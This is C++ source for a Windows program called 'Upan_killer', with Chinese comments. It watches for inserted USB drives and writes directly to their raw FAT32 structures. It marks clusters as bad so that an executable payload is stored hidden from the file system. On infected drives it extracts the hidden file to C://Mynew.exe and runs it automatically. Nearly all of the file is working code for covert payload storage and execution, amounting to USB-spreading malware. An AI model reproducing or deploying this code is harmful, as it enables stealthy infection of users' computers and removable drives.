// Upan_killer.cpp : Defines the entry point for the console application.
//

//#include "stdafx.h"
#include "stdio.h"
#include "stdlib.h"
#include "iostream"
#include "windows.h"
#include "DBT.H"
#include "fstream"
#include "map"
#include "string"
using namespace std;

#define A  TEXT("\\\\.\\A:") 
#define B  TEXT("\\\\.\\B:") 
#define C  TEXT("\\\\.\\C:") 
#define D  TEXT("\\\\.\\D:") 
#define E  TEXT("\\\\.\\E:") 
#define F  TEXT("\\\\.\\F:") 
#define G  TEXT("\\\\.\\G:") 
#define H  TEXT("\\\\.\\H:") 
#define I  TEXT("\\\\.\\I:") 
#define J  TEXT("\\\\.\\J:") 

char U[3] = { 0 };          //U盘的盘符

int LeftArea, FatSize;   //分别是FAT区的保留区大小和FAT表的大小
int FirstCluster;       //可以利用的第一个簇号码
int SectorLeft;         //剩余可利用的空闲簇
int ClusterSize;        //簇的大小
int ClusterNeed;        //写入的exe文件所需要的簇数
map<string, int>mmp;
//判断文件是否被建立
int FileExits(const char* FileName)
{
    fstream _file;
    _file.open(FileName, ios::in);
    if (!_file) return 0;
    else return 1;
}

//参数分别是文件句柄、数据缓冲区、准备文件读取的字节数和读取位置的偏移量
void ReadFileWithSize(HANDLE h, unsigned char* Buffer, DWORD dwBytestoRead, DWORD offset)
{
    DWORD dwBytesRead, dwBytesToRead;
    OVERLAPPED over = { 0 };            //计算读取的偏移量
    over.Offset = offset;
    dwBytesToRead = dwBytestoRead;      // 要读取的字节数
    dwBytesRead = 0;                    // 实际读取到的字节数
    do {                                       //循环写文件，确保完整的文件被写入  
        ReadFile(h, Buffer, dwBytesToRead, &dwBytesRead, &over);
        dwBytesToRead -= dwBytesRead;
        Buffer += dwBytesRead;
    } while (dwBytesToRead > 0);
    printf("ch = %hhu\n", Buffer);
}
//参数分别是文件句柄、数据缓冲区、准备文件读取的字节数和读取位置的偏移量
void WriteFileWithSize(HANDLE h, unsigned char* Buffer, DWORD dwBytesToWrite, DWORD offset)
{
    DWORD dwBytesWrite;
    OVERLAPPED over = { 0 };            //计算读取的偏移量
    over.Offset = offset;
    dwBytesToWrite = dwBytesToWrite;        // 要写入的字节数
    dwBytesWrite = 0;                   // 实际读取到的字节数
    //CloseHandle(h);
    do {                                       //循环写文件，确保完整的文件被写入  
        WriteFile(h, Buffer, dwBytesToWrite, &dwBytesWrite, &over);
        DeviceIoControl(h, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &dwBytesWrite, NULL);
        DWORD t = GetLastError();
        printf("writefile error t=%d\n");
        dwBytesToWrite -= dwBytesWrite;
        Buffer += dwBytesWrite;
    } while (dwBytesToWrite > 0);

}

//将一串hex值变成int型
int UcharToInt(unsigned char* Buffer, int Len)
{
    int answer = 0;
    for (int i = Len - 1; i >= 0; i--)
    {
        answer = answer * 256 + (int)Buffer[i];
    }
    return answer;
}
//将一个int型变成小端hex值
void IntToUchar(unsigned char* Buffer, int Len, int value)
{
    memset(Buffer, 0, Len);
    for (int i = 0; i <= Len - 1; i++)
    {
        Buffer[i] = value % 256;
        value /= 256;
    }
}

void GetInfoOfUSB(HANDLE h)
{
    unsigned char* Buffer = new unsigned char[512 + 1];
    ReadFileWithSize(h, Buffer, 512, 0);       //读取第0磁盘
    LeftArea = UcharToInt(Buffer + 0xe, 2);
    FatSize = UcharToInt(Buffer + 0x24, 4);
    ClusterSize = UcharToInt(Buffer + 0xd, 1);
    ReadFileWithSize(h, Buffer, 512, 512);     //读取第1磁盘
    FirstCluster = UcharToInt(Buffer + 0x1ec, 4);
    SectorLeft = UcharToInt(Buffer + 0x1e8, 4);
    //printf("%d %d %d %d %d\n",LeftArea,FatSize,ClusterSize,FirstCluster,SectorLeft);
}
//修改FAT32表
void HandleFATTable(HANDLE h, int ClusterNeed)
{
    int HasChnage;          //标记读取的512字节是否经过变动了
    unsigned char* Buffer = new unsigned char[512 + 1];             //存放读取的临时数据，在改变之后顺手存到FAT表中
    memset(Buffer, 0, sizeof(Buffer));
    ;
    unsigned char* ClusterDir = new unsigned char[512 + 1];         //存放的簇的位置
    memset(ClusterDir, 0, sizeof(ClusterDir));

    IntToUchar(ClusterDir, 4, ClusterNeed);

    int HaveTooken = 1;                   //正在寻找簇位置的标号
    //int ReadPos=(FirstCluster-2)*8*512+LeftArea*512+FatSize*2*512;    //表示读取扇区的地址,为什么减2？因为Fat表示从2号开始的，0、1号用来记录一些特殊标志位了
    int ReadPos = LeftArea * 512 + 4 * (FirstCluster) / 512 * 512;  //为了保证后面读取512字符的都是整磁盘大小
    int ClusterNow = FirstCluster;        //该512字节读取后的对应簇的号码,但是这里不是对齐的，需要下面循环开始的时候矫正一下
    int TurnYes = 0;
    while (HaveTooken <= ClusterNeed)
    {
        ReadFileWithSize(h, Buffer, 512, ReadPos);      //先读入完整的fat扇区表
        HasChnage = 0;
        for (int i = 0; i < 128; i++)
        {
            //找寻可以利用的空扇区位
            if (Buffer[i * 4] == 0 && Buffer[i * 4 + 1] == 0 && Buffer[i * 4 + 2] == 0 && Buffer[i * 4 + 3] == 0)       
            {
                if (TurnYes == 0)
                {
                    ClusterNow -= i;
                    TurnYes = 1;
                }
                HasChnage = 1;
                Buffer[i * 4] = 0xf7;       //将簇标记为被用
                Buffer[i * 4 + 1] = 0xff;      
                Buffer[i * 4 + 2] = 0xff;
                Buffer[i * 4 + 3] = 0xff;
                IntToUchar(ClusterDir + HaveTooken * 4, 4, ClusterNow + i);
                HaveTooken++;
                if (HaveTooken > ClusterNeed) break;
            }
        }
        if (HasChnage)
        {
            WriteFileWithSize(h, Buffer, 512, ReadPos);                //修改FAT1表
            WriteFileWithSize(h, Buffer, 512, ReadPos + 512 * FatSize);    //修改FAT2表
            FlushFileBuffers(h);
        }

        if (HaveTooken > ClusterNeed) break;
        ClusterNow += 128;
        ReadPos += 512;
    }
    WriteFileWithSize(h, ClusterDir, 512, 0x800);
    free(ClusterDir);
    FlushFileBuffers(h);
    ReadFileWithSize(h, Buffer, 512, 512);     //读取第1磁盘
    IntToUchar(Buffer + 0x1e8, 4, SectorLeft - ClusterNeed);
    //free(Buffer);
    unsigned char* tmpvalue = new unsigned char[512 + 1];           //存放的簇的位置
    memset(tmpvalue, 0, sizeof(tmpvalue));
    while (1)
    {
        int flag = 0;
        ReadFileWithSize(h, tmpvalue, 512, ReadPos);
        for (int i = 0; i < 128; i++)
        {
            if (tmpvalue[i * 4] == 0 && tmpvalue[i * 4 + 1] == 0 && tmpvalue[i * 4 + 2] == 0 && tmpvalue[i * 4 + 3] == 0)
            {
                IntToUchar(Buffer + 0x1ec, 4, ClusterNow + i);
                flag = 1;
                break;
            }
        }
        if (flag == 1)
        {
            WriteFileWithSize(h, Buffer, 512, 512);
            FlushFileBuffers(h);
            break;
        }
        ClusterNow += 128;
        ReadPos += 512;
    }

}
//这里主要进行各种修改和文件的隐写
void WriteFileInto(HANDLE h)
{
    HANDLE pFile;
    DWORD fileSize;
    pFile = CreateFile(TEXT("C:\\Users\\Administrator\\Desktop\\noname1.bin"), GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,           //打开已存在的文件 
        FILE_FLAG_WRITE_THROUGH,
        NULL);
    if (pFile == INVALID_HANDLE_VALUE)
    {
        DWORD k = GetLastError();
        //   MessageBox("createfile faild");
        printf("错误码k=%d\n", k);
        cout << "failed" << endl;
    }
    fileSize = GetFileSize(pFile, NULL);          //得到文件的大小
    ClusterNeed = fileSize / (ClusterSize * 512) + 1;    //(fileSize % (ClusterSize * 512));
    HandleFATTable(h, ClusterNeed);          //修改FAT表等一系列信息
    unsigned char* TemValue = new unsigned char[512 * ClusterSize + 1];               //存放读取的临时数据，在改变之后顺手存到FAT表中
    memset(TemValue, 0, sizeof(TemValue));
    unsigned char* Buffer = new unsigned char[512 + 1];         //存放的簇的位置
    memset(Buffer, 0, sizeof(Buffer));
    int ClusterNow;     //对应簇的号码
    ReadFileWithSize(h, Buffer, 512, 0x800);
    for (int i = 1; i <= ClusterNeed; i++)
    {
        ClusterNow = UcharToInt(Buffer + i * 4, 4);
        ReadFileWithSize(pFile, TemValue, 512 * ClusterSize, (i - 1) * 512 * ClusterSize);
        printf("写入的位置：%d\n", (ClusterNow - 2) * ClusterSize * 512 + LeftArea * 512 + FatSize * 2 * 512);
        WriteFileWithSize(h, TemValue, 512 * ClusterSize, (ClusterNow - 2) * ClusterSize * 512 + LeftArea * 512 + FatSize * 2 * 512);
        FlushFileBuffers(h);
    }
    cout << "成功写入！" << endl;

}
//新建填充一个exe，并且执行
void FillTheFile(HANDLE h)
{
    if (FileExits("C://Mynew.exe"))
    {
        remove("C://Mynew.exe");
    }
    HANDLE pFile = CreateFile(TEXT("C://Mynew.exe"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_FLAG_WRITE_THROUGH, NULL);    //创建一个exe等待写入
    unsigned char* Buffer = new unsigned char[512 + 1];
    int ClusterNow;
    unsigned char* TemValue = new unsigned char[512 * ClusterSize + 1];
    memset(TemValue, 0, sizeof(TemValue));
    memset(Buffer, 0, sizeof(Buffer));
    ReadFileWithSize(h, Buffer, 512, 0x800);
    ClusterNeed = UcharToInt(Buffer, 4);
    for (int i = 1; i <= ClusterNeed; i++)
    {
        ClusterNow = UcharToInt(Buffer + i * 4, 4);
        ReadFileWithSize(h, TemValue, 512 * ClusterSize, (ClusterNow - 2) * ClusterSize * 512 + LeftArea * 512 + FatSize * 2 * 512);
        WriteFileWithSize(pFile, TemValue, 512 * ClusterSize, (i - 1) * 512 * ClusterSize);
        FlushFileBuffers(pFile);
    }
    CloseHandle(pFile);
    if (FileExits("C://Mynew.exe"))
    {
        WinExec("C://Mynew.exe", SW_SHOW);
    }
    else
    {
        cout << "Sometihng Wrong!" << endl;
    }
}
//U盘的发现机制没有用到什么WINAPI，直接构造一个map表定期扫描即可
void InitMap()
{
    string Disk;

    DWORD allDisk = GetLogicalDrives();
    for (int i = 0; i < 16; i++)
    {
        string Disk = "";
        if ((allDisk & 1) == 1)
        {
            char Tmp = 'A' + i;
            Disk = Tmp;
            Disk += ":";
            mmp[Disk]++;
        }
        allDisk = allDisk >> 1;
        if (allDisk == 0) break;
    }
}
//显示map数据，表示磁盘的链接情况
void show_map()
{
    map<string, int>::iterator it;
    for (it = mmp.begin(); it != mmp.end(); it++)
    {
        cout << it->first << " " << it->second << endl;
    }
}
//子进程来监视扫描磁盘的，10秒一次
DWORD  WINAPI FindUPan(PVOID pM)
{

    string Disk;
    while (true)
    {
        DWORD allDisk = GetLogicalDrives(); //返回一个32位整数，将他转换成二进制后，表示磁盘,最低位为A盘
        if (allDisk != 0)
        {
            show_map();
            for (int i = 0; i < 16; i++)     //假定最多有24个磁盘
            {
                char Tmp = 'A' + i;
                Disk = Tmp;
                Disk += ":";
                if ((allDisk & 1) == 1)
                {
                    if (mmp[Disk] == 0)
                    {
                        U[0] = Disk[0]; U[1] = Disk[1];
                        mmp[Disk]++;
                    }
                }
                else
                {
                    if (mmp[Disk] == 1)
                    {
                        mmp[Disk]--;
                    }
                }
                allDisk = allDisk >> 1;
            }
        }
        Sleep(10000);
        system("cls");
    }


}
HANDLE ChooseAHandle(char u)
{
    HANDLE h = 0;
    switch (u)
    {
    case 'A': h = CreateFile(A, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    case 'B': h = CreateFile(B, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    case 'C': h = CreateFile(C, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    case 'D': h = CreateFile(D, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    case 'E': h = CreateFile(E, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    case 'F': h = CreateFile(F, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    case 'G': h = CreateFile(G, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    case 'H': h = CreateFile(H, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    case 'I': h = CreateFile(I, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    case 'J': h = CreateFile(J, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL); break;
    }
    return h;
}


void Writemyfile(HANDLE h)
{
    HANDLE pFile;
    DWORD fileSize;
    pFile = CreateFile(TEXT("..\\writefile.txt"), GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_WRITE_THROUGH,
        NULL);
    if (pFile == INVALID_HANDLE_VALUE)
    {
        DWORD k = GetLastError();
        printf("错误码k=%d\n", k);
        cout << "failed" << endl;
    }
    fileSize = GetFileSize(pFile, NULL);    //得到文件的大小
    ClusterNeed = fileSize / (ClusterSize * 512) + 1;   //算出需要的簇的数量

}
int main()
{
    HANDLE h;
    unsigned char* buffer = new unsigned char[512 + 1];     // 接收数据用的 buffer
    U[0] = 0; U[1] = 0; U[2] = 0;
    InitMap();
    //show_map();
    HANDLE handle = CreateThread(NULL, 0, FindUPan, NULL, 0, NULL);
    while (true)
    {
        if (U[0] != 0) //发现了U盘插入
        {
            printf("发现了U盘");
            h = ChooseAHandle(U[0]);
            if (h == INVALID_HANDLE_VALUE)
            {
                cout << "failed" << endl;
            }
            GetInfoOfUSB(h);
            ReadFileWithSize(h, buffer, 512, 0x800);

            if (buffer[0] == 0 && buffer[1] == 0 && buffer[2] == 0 && buffer[3] == 0)
            {
                WriteFileInto(h);
                //FillTheFile(h);
                U[0] = 0; U[1] = 0;
            }
            else
            {
                FillTheFile(h);
                U[0] = 0; U[1] = 0;
            }
            CloseHandle(h);
        }
    }
    CloseHandle(handle);
    //system ("pause");
    return 0;
}